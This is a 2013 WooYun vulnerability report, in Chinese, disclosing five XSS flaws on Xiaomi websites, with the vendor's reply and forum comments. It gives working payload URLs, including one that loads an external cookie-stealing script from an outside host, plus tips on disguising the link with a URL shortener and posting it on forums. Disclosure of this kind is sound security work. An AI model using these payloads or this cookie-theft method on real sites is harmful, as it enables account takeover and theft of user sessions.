{"id": 8807, "wybug_id": "wooyun-2013-036200", "wybug_title": "小米5个XSS漏洞，可以盗取cookie并成功登录", "wybug_corp": "小米科技", "wybug_author": "px1624", "wybug_date": "2013-09-05 17:54", "wybug_open_date": "2013-10-20 17:54", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["小米"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-20：\t细节向公众公开  简要描述： 3×5=15rankxiaomi3 V5!for F mark~ 详细说明：  一、小米手机台湾官网1个反射型XSS（http://tw.xiaomi.com域名）1 url：\nhttp://tw.xiaomi.com/accessories/all?adapt=&page=1\n中，其中参数page没有对xss代码进行过滤，导致可以XSS。构造后的利用URL：\nhttp://tw.xiaomi.com/accessories/all?adapt=&page=1aaaaa%22%3E%3Cimg%20src=1%20onerror=alert(1)%3E\n\n\n2 观察了一下发现，http://tw.xiaomi.com和www.xiaomi.com两个域名的登录是相通的，而且都没有http-only。所以用此反射型xss盗取了cookie后就可以直接登录用户的小米账户了（我自己用两个浏览器验证过）。构造插入任意外部js文件的url:\nhttp://tw.xiaomi.com/accessories/all?adapt=&page=1aaaa%22%3E%3Cimg%20src=1%20onerror=%22with(document)body.appendChild(createElement(String.fromCharCode(115,99,114,105,112,116))).src='//pxss.sinaapp.com/wCLExF'%22%3E\n\n\n3 地址这么长，看起来都有点引起怀疑，用百度短地址（http://dwz.cn/）处理下。得到：http://dwz.cn/au0ND\n\n4 上面的利用构造代码，只在IE下有用，在谷歌（包括谷歌内核浏览器，如360、猎豹等）浏览器下，会干掉onerror后面的东西，导致XSS失败。但是在谷歌下，我们可以通过谷歌浏览器特有的date协议来构造xss。\nurl:http://tw.xiaomi.com/accessories/all?adapt=&page=1aa\"><script src=data:,alert(1)<!--\n\n\n哈哈，这样就可以通杀所有浏览器了！利用方法：发到社区论坛神马的地方，只要用户在点击的时候有登录www.xiaomi.com，那么账户cookie就会被盗，从而就可以登录用户小米账户。二、小米ROM下载频道4个DOM-XSS（http://rom.xiaomi.cn域名）1 首先对这个地址的四个参数进行输出观察，分别对每个参数进行标记。访问下面参数带有标记的地址：\nhttp://rom.xiaomi.cn/list-169-1.html?mobileTypeValue=88952634aaaa&hardwareVersionValue=88952634bbbb&romTypeValue=88952634cccc&softwareVersionValue=88952634dddd\nF12查找一下标记的参数，发现有输出在js代码中。\n\n2 试着去构造闭合一下，观察前后代码的环境，得出构造代码\n：)});alert(1);(function%20a(){//\n带入到URL中，得到 \nhttp://rom.xiaomi.cn/list-169-1.html?mobileTypeValue=88952634)});alert(1);(function%20a(){//&hardwareVersionValue=88952634&romTypeValue=88952634&softwareVersionValue=88952634\n访问一下，哈哈，弹窗了。很典型的一个DOM-XSS。\n\n3 下面F12看下，可以很直观的看到XSS的触发原理。\n\n4 其他三个参数的XSS构造方法同上，这里不在一一截图了。下面列出4个DOM-XSS\nhttp://rom.xiaomi.cn/list-169-1.html?mobileTypeValue=88952634)});alert(1);(function%20a(){//&hardwareVersionValue=88952634&romTypeValue=88952634&softwareVersionValue=88952634http://rom.xiaomi.cn/list-169-1.html?mobileTypeValue=88952634&hardwareVersionValue=88952634)});alert(2);(function%20a(){//&romTypeValue=88952634&softwareVersionValue=88952634http://rom.xiaomi.cn/list-169-1.html?mobileTypeValue=88952634&hardwareVersionValue=88952634&romTypeValue=88952634)});alert(3);(function%20a(){//&softwareVersionValue=88952634http://rom.xiaomi.cn/list-169-1.html?mobileTypeValue=88952634&hardwareVersionValue=88952634&romTypeValue=88952634&softwareVersionValue=88952634)});alert(4);(function%20a(){//\n 利用：这个域名是有加http-only的，所以盗取到cookie是没多大用处的，但是可以写钓鱼页面之类的去骗用户的账户密码。也可以通过写入js发包请求来执行一些用户的操作，获取用户信息等。   漏洞证明：  看上面。   修复方案：  1 对相关有XSS缺陷的参数的特殊字符进行过滤。2 上个漏洞是给我求小米3的F码，这个是给朋友求的。thanks for read~   版权声明：转载请注明来源 px1624@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2013-09-06 10:44 厂商回复： 感谢关注小米安全。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-05 17:54 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  你弄红米F码 上瘾了~    \n     2013-09-05 18:13 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  送你M3一台 地址请PM给我！    \n     2013-09-05 18:16 |    \t\t　 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 　)\t\t \n  @px1624  求个F码~    \n     2013-09-05 21:59 |    \t\t天朝城管 \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:35        | 不要等到命玩你的时候才开始玩命)\t\t \n  听说米3快出来了   yy一下    \n     2013-09-05 22:32 |    \t\tevavus \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:11        | @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...)\t\t \n  @px1624 15WB换个小米2S 32G的F码可以吗？    \n     2013-09-05 22:34 |    \t\t忆闪而过 \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:6        | 寂寞在唱歌)\t\t \n  已通过其他渠道知晓此问题，正在安排处理中，感谢对小米科技的关注。    \n     2013-09-06 07:59 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @天朝城管 就是看了小米3发布会，想买才来发洞的。。    \n     2013-09-06 08:00 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @evavus 。。。2s 32G版本估计可以抢到吧！要么你私信给我你的小米帐号（最好给个小号），到时候我去给你抢。抢到了15WB额、哈哈    \n     2013-09-06 08:00 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @忆闪而过 。。。你以为是TX呢。    \n     2013-09-08 18:20 |    \t\tevavus \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:11        | @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...)\t\t \n  @px1624 10WB帮我抢个小米2S    \n     2013-09-08 22:10 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @evavus 。。。别报多大希望，到时候我试试额    \n     2013-09-09 17:36 |    \t\tevavus \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:11        | @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...)\t\t \n  @px1624 我在学校没办法抢，明天全靠你了    \n     2013-09-09 20:29 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @evavus 。。。我尽力吧。。。网速不给力的说    \n     2013-10-06 16:22 |    \t\t厦门佬 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:8        )\t\t \n  还以为有我的呢!等了一个月准备发了:)    \n     2013-10-06 17:35 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @厦门佬 小心放久了，被修补了。。    \n     2013-10-20 18:47 |    \t\tMutoubug \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:16        | <script>alert(wooyun);</script>)\t\t \n  mark..    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}